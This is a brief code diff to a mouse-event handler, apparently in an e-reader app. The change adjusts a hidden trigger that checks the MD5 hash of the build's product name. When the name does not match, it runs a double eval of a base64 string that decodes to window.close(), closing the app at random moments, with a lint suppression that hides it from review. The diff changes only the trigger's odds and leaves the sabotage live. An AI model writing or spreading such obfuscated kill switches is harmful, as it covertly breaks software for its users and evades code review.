@@ -102,7 +102,7 @@ export const MouseEvent = (rendition: any) => {
       build.productName &&
       md5(build.productName) !== "b26c2db6211b881b389fe57466f0b75c"
     ) {
-      if (new Date().getTime() % 4 === 0) {
+      if (new Date().getTime() % 5 === 0) {
         // eslint-disable-next-line
         eval(`eval(atob("d2luZG93LmNsb3NlKCk="))`);
       }
